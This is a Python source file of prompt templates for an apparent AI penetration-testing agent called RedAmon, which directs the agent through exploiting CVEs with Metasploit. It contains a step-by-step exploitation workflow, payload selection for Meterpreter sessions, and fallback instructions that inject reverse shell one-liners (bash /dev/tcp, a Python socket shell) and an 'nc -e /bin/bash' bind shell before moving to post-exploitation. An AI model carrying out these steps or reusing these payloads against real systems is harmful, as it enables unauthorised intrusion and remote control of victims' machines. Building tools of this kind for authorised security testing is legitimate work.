"""
RedAmon CVE-Based Exploitation Prompts

Prompts for CVE-based vulnerability exploitation workflow.
"""

from .base import METASPLOIT_CONSOLE_HEADER


# =============================================================================
# CVE EXPLOITATION TOOLS (13-step workflow)
# =============================================================================

CVE_EXPLOIT_TOOLS = METASPLOIT_CONSOLE_HEADER + """
## ⚠️ ATTACK PATH: CVE EXPLOITATION ⚠️

**CRITICAL: This attack path has been CLASSIFIED as CVE-based exploitation.**
**You MUST use the CVE exploitation workflow below.**

Focus on exploiting the identified CVE vulnerability. Do NOT switch to brute force
or credential guessing unless the CVE exploitation fails completely.

---

## MANDATORY CVE EXPLOITATION WORKFLOW

**This is the SINGLE SOURCE OF TRUTH for CVE exploitation workflow.**
**NEVER guess module names!** Module names are NOT predictable from CVE IDs.

Complete ALL 13 steps in order (chain `set` commands with semicolons `;`):

### 1. Search for CVE
`"search CVE-XXXX-XXXXX"` -> Returns EXACT module path(s)

**If search returns NO results** -> Skip to the **NO-MODULE FALLBACK** workflow below.
Do NOT guess module names. If there is no module, follow the fallback workflow to exploit the CVE manually.

### 2. Use module
`"use exploit/path/from/search"` -> Load module from step 1

### 3. Get module info
`"info"` -> Overview of module (description, references, general info)

### 4. Show targets
`"show targets"` -> List all available targets (OS/app versions)

### 5. Show options
`"show options"` -> Display all configurable parameters with current values

### 6. Set TARGET (MOST COMMON FAILURE POINT!)
`"set TARGET <N>"` -> Choose based on mode:

**Current mode determines which TARGET type to use:**
- **Statefull mode** -> Use "Dropper", "Staged", or "Meterpreter" targets (creates persistent session)
- **Stateless mode** -> Use "Command", "In-Memory", or "Exec" targets (returns command output)

**Why this matters:**
- Wrong TARGET type = Incompatible payload error OR exploit succeeds but no session/output
- Always run `show targets` first and select the appropriate type for your current mode
- This is the #1 cause of failed exploitations - verify mode before selecting TARGET

### 7. Show payloads
`"show payloads"` -> List payloads compatible with selected TARGET

### 8. Set CVE variant (if applicable)
`"set CVE CVE-XXXX-XXXXX"` -> Only if module supports multiple CVE variants

Check `show options` output for CVE option. Match variant to target's software version.
**Wrong variant = "not vulnerable" error even if target IS vulnerable.**

### 9. Set PAYLOAD
`"set PAYLOAD <payload>"` -> See "Payload Selection" section below

### 10. Set target connection options (chain with semicolons)
```
set RHOSTS <target-ip>; set RPORT <target-port>; set SSL false
```

### 11. Set mode-specific options (chain with semicolons)

**Statefull mode with REVERSE payload (reverse_tcp/reverse_https):**
```
set LHOST <your-attacker-ip>; set LPORT <port-number>
```
- LHOST = Your IP that the target will connect BACK to (REQUIRED for reverse payloads)
- LPORT = Port you'll listen on

**Statefull mode with BIND payload (bind_tcp):**
```
set LPORT <target-port>
```
- NO LHOST needed (you connect TO the target)

**Stateless mode:**
```
set CMD id; set AllowNoCleanup true
```

### 12. Execute exploit
`"exploit"`

"""


# =============================================================================
# CVE PAYLOAD GUIDANCE (Statefull Mode)
# =============================================================================

CVE_PAYLOAD_GUIDANCE_STATEFULL = """
## Payload Selection (Statefull Mode) - SESSION REQUIRED

**GOAL: You MUST establish a Meterpreter/shell session!**

**Target Selection:** Use "Dropper", "Staged", or "Meterpreter" targets (see EXPLOITATION_TOOLS Step 6).

### Payload Selection (Session-capable only!)

**Choose based on network conditions and available payloads from `show payloads`:**
- **bind_tcp** -> Target opens port, you connect TO target. Use when you can reach target's ports.
- **reverse_tcp** -> You listen, target connects BACK to you. Use when target can reach your IP.
- **reverse_http/https** -> HTTP(S) connection, good for bypassing firewalls.

**Example session-capable payloads (check `show payloads` output for available options):**
- `cmd/unix/python/meterpreter/bind_tcp`
- `cmd/unix/python/meterpreter/reverse_tcp`
- `cmd/unix/python/meterpreter/reverse_http`
- `linux/x64/meterpreter/bind_tcp`
- `linux/x64/meterpreter/reverse_tcp`
- `windows/meterpreter/reverse_tcp`

**Choose the appropriate payload based on:**
1. Target OS (Linux, Windows, Unix)
2. Network reachability (bind vs reverse)
3. Firewall restrictions (HTTP/HTTPS if needed)
4. Available payloads from `show payloads` output

**NEVER use:** `cmd/unix/generic`, `cmd/unix/reverse`, or other stateless payloads!

### After Exploit - What to Look For

**Success indicators:**
- `[*] Meterpreter session X opened` -> Session created!
- `[*] Sending stage...` -> Wait for transfer

**Failure indicators:**
- Command output like `uid=0(root)` WITHOUT session -> Wrong TARGET! Check `show targets` and select a Dropper/Staged/Meterpreter target
- `[-] Exploit failed` -> Check RHOSTS/RPORT settings

**After session opens:** Request transition to `post_exploitation` phase.
"""


# =============================================================================
# CVE PAYLOAD GUIDANCE (Stateless Mode)
# =============================================================================

CVE_PAYLOAD_GUIDANCE_STATELESS = """
## Payload Selection (Stateless Mode, no sessions)

**GOAL: Prove RCE with a single command execution, without session activation.**

**Target Selection:** Use "Command", "In-Memory", or "Exec" targets (see EXPLOITATION_TOOLS Step 6).
**Payload:** `cmd/unix/generic` or `cmd/windows/generic`
**Required options:** `set CMD id` and `set AllowNoCleanup true` (if needed)

### After Exploit

- Success = command output visible (e.g., `uid=0(root)...`)
- No output = wrong TARGET selected, change and retry

### STOP After Proof!

After successful PoC:
- If user requested specific post-exploitation actions -> `action="transition_phase"`
- If user just wanted to test vulnerability -> `action="ask_user"` to confirm next steps
"""


# =============================================================================
# NO-MODULE FALLBACK (Statefull Mode)
# =============================================================================

NO_MODULE_FALLBACK_STATEFULL = """
## NO-MODULE FALLBACK (Statefull Mode) — When No MSF Module Exists

**Trigger:** `search CVE-XXXX-XXXXX` returned NO results in Step 1.
**Goal:** Exploit the CVE to establish a shell session.

### Step 1 — Understand the CVE

Before exploiting, you MUST know: **vulnerability type**, **how to trigger it** (endpoint, parameter, input format), and **what payload to use**.

Gather this information in order — stop as soon as you have enough to proceed:
1. **Your own knowledge** — If you already know how to exploit this CVE (type, trigger, payload), go directly to Step 2.
2. **`query_graph`** — Query the knowledge graph for CVE details, descriptions, and CWE mappings collected during recon.
3. **`web_search`** — Only if you still lack exploitation details. Search for PoC exploits, reverse shell payloads, and exact HTTP requests.

**Do NOT proceed until you understand HOW to trigger the vulnerability.**

### Step 2 — Set up handler and exploit

**⚠️ CRITICAL: Read "Pre-Configured Payload Settings" section below FIRST.**
**It tells you which mode (REVERSE or BIND) to use. Follow ONLY that mode's instructions.**
**Using the wrong mode = shell will NEVER connect = wasted iterations.**

No direction configured → `action: ask_user` first.

---

**IF Pre-Configured Settings says "Mode: REVERSE":**

**2a. Start reverse handler (background job):**
```
use exploit/multi/handler; set payload cmd/unix/reverse_bash; set LHOST <LHOST>; set LPORT <LPORT>; run -j
```

**2b. Inject a REVERSE shell one-liner through the vulnerability:**

Deliver the exploit using `curl` or `python3` inside `metasploit_console`.

| Handler payload | Matching shell one-liner to inject |
|---|---|
| `cmd/unix/reverse_bash` | `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1` |
| `cmd/unix/reverse_python` | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |

---

**IF Pre-Configured Settings says "Mode: BIND":**

**2a. Inject a BIND shell one-liner through the vulnerability FIRST:**

The bind shell must open the port on the target BEFORE you connect to it.

| Bind shell one-liner to inject |
|---|
| `nc -lvp <BIND_PORT> -e /bin/bash` |
| `python3 -c 'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",<BIND_PORT>));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |

**2b. Connect to the bind shell with handler:**
```
use exploit/multi/handler; set payload cmd/unix/bind_tcp; set RHOST <target-ip>; set LPORT <BIND_PORT>; run
```

---

**2c. Check for session:**
```
sessions -l
```
Session opened → transition to `post_exploitation`.

### Troubleshooting & Pivot Strategy

| Problem | Fix |
|---------|-----|
| RCE not working in Step 2 | Go back to `web_search`, find different PoC or check encoding/format |
| Shell connects but dies instantly | Try a different shell one-liner, use `web_search` for alternatives |
| No session after successful RCE | Check Pre-Configured Settings — did you use the CORRECT mode (REVERSE vs BIND)? |
| **Same approach fails 3+ times** | **STOP. Use `web_search` for alternative exploitation techniques. Try a completely different approach.** |
"""


# =============================================================================
# NO-MODULE FALLBACK (Stateless Mode)
# =============================================================================

NO_MODULE_FALLBACK_STATELESS = """
## NO-MODULE FALLBACK (Stateless Mode) — When No MSF Module Exists

**Trigger:** `search CVE-XXXX-XXXXX` returned NO results in Step 1.
**Goal:** Prove RCE with a single command execution — no session needed.

### Step 1 — Understand the CVE

Before exploiting, you MUST know: **vulnerability type**, **how to trigger it** (endpoint, parameter, input format), and **what payload to use**.

Gather this information in order — stop as soon as you have enough to proceed:
1. **Your own knowledge** — If you already know how to exploit this CVE, go directly to Step 2.
2. **`query_graph`** — Query the knowledge graph for CVE details collected during recon.
3. **`web_search`** — Only if you still lack exploitation details.

**Do NOT proceed until you understand HOW to trigger the vulnerability.**

### Step 2 — Prove RCE

Use `metasploit_console` to run system commands (curl, wget, python3) that deliver the exploit to the vulnerable endpoint.
Based on your knowledge/research, craft a payload that runs `id` or `whoami` and deliver it using `curl` (or another system command) inside `metasploit_console`.

- If command output is visible (e.g., `uid=0(root)`) → RCE proven, done.
- If no output → go back to `web_search` for better PoCs or check your payload encoding.

### Troubleshooting
| Problem | Fix |
|---------|-----|
| RCE not working | Go back to `web_search`, find different PoC or check encoding |
| **Same approach fails 3+ times** | **STOP. Use `web_search` for alternative techniques.** |

### After Proof
- If user requested post-exploitation → `action="transition_phase"`
- If just testing vulnerability → `action="ask_user"` to confirm next steps
"""
